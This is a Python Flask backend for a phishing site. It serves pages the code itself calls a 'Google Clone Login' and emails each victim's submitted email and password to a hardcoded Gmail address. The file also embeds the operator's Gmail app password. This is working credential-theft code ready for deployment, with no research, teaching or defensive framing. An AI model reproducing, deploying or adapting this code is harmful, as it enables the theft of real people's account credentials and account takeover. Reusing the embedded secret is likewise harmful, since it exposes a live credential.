from flask import Flask, request, jsonify, render_template
import smtplib
from email.mime.text import MIMEText
import os

app = Flask(__name__)

# === CHANGE THIS ===
EMAIL_SENDER = "davideje12345@gmail.com"
EMAIL_PASSWORD = "mgikbmggpkpivaln"  # Use the Gmail App Password
EMAIL_RECEIVER = "davideje12345@gmail.com"  # Can be same as sender

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/password')
def password():
    return render_template('password.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")

    msg = MIMEText(f"Email: {email}\nPassword: {password}")
    msg["Subject"] = "New Google Clone Login"
    msg["From"] = EMAIL_SENDER
    msg["To"] = EMAIL_RECEIVER

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        return jsonify({"status": "success"})
    except Exception as e:
        print("Error:", e)
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)